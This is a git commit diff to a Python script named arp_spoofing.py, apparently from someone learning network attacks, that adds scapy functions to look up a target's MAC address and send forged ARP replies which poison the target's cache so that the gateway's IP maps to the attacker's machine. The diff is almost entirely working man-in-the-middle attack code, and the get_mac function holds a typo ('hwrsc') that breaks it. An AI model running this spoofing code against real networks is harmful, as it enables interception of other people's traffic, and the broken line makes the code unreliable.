44ef892fb2bd1eaeed9eebcb197c45a5429eaa0b
EEthanZZ <zycc2727@gmail.com>
2023-09-17 04:16:30 -0400

    automatically get target MAC

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -8,7 +8,21 @@ psrc = set the packet source IP to gateway IP addr
 """
 
 
-packet = scapy.ARP(op=2, pdst="192.168.159.133", hwdst="00:0C:29:DE:6B:09", psrc="192.168.159.2")
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst = ip)
+    # print(arp_request.summary())
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    # print(broadcast.summary())
+    arp_broadcast = broadcast/arp_request
+    # arp_broadcast.show()
+    ans_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
+    return ans_list[0][1].hwrsc
+
+
+def spoof(target_ip, spoof_ip,):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)  # command change the default gateway IP to attacker MAC addr
 
 
 """
@@ -16,4 +30,3 @@ print(packet.show())
 print(packet.summary())
 summarize the packet generate above
 """
-scapy.send(packet) # command change the default gateway IP to attacker MAC addr
